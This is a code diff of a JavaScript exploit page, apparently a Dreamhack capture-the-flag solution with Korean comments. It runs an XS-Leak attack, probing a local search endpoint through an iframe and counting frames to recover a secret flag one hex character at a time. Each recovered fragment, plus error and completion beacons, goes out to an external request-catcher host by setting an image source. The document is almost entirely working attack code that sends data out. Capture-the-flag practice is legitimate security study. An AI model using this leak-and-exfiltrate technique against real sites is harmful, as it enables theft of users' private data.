@@ -2,30 +2,57 @@
 <img id="img" />
 
 <script>
+  const iframe = document.getElementById("iframe");
+  const img = document.getElementById("img");
+
   async function searchChar(data) {
     return new Promise((resolve) => {
-      iframe.src = "http://127.0.0.1:8000/search?query=" + data;
       iframe.onload = () => {
         resolve(iframe.contentWindow.frames.length > 0);
       };
+
+      iframe.src =
+        "http://127.0.0.1:8000/search?query=" + encodeURIComponent(data);
     });
   }
 
-  const iframe = document.getElementById("iframe");
-  const img = document.getElementById("img");
-  const chars = "0123456789abcdef}";
-  let flag = "DH{";
+  const chars = "0123456789abcdef";
+
+  // 이전 실행에서 얻은 값부터 계속 시작
+  let flag = "DH{22d1445ad68";
 
   async function findFlag() {
-    while (flag.length <= 35) {
-      for (let i = 0; i < chars.length; i++) {
-        if (await searchChar(flag + chars[i])) {
-          flag += chars[i];
-          img.src = "https://lhvrqrj.request.dreamhack.games?flag=" + flag;
+    // DH{ 3글자 + 해시 32글자 = 길이 35
+    while (flag.length < 35) {
+      let found = false;
+
+      for (const char of chars) {
+        if (await searchChar(flag + char)) {
+          flag += char;
+          found = true;
+
+          img.src =
+            "https://lhvrqrj.request.dreamhack.games/?flag=" +
+            encodeURIComponent(flag);
+
           break;
         }
       }
+
+      // 일치하는 문자가 없을 때 무한 반복 방지
+      if (!found) {
+        img.src =
+          "https://lhvrqrj.request.dreamhack.games/?error=" +
+          encodeURIComponent(flag);
+        return;
+      }
     }
+
+    flag += "}";
+
+    img.src =
+      "https://lhvrqrj.request.dreamhack.games/?complete=" +
+      encodeURIComponent(flag);
   }
 
   findFlag();
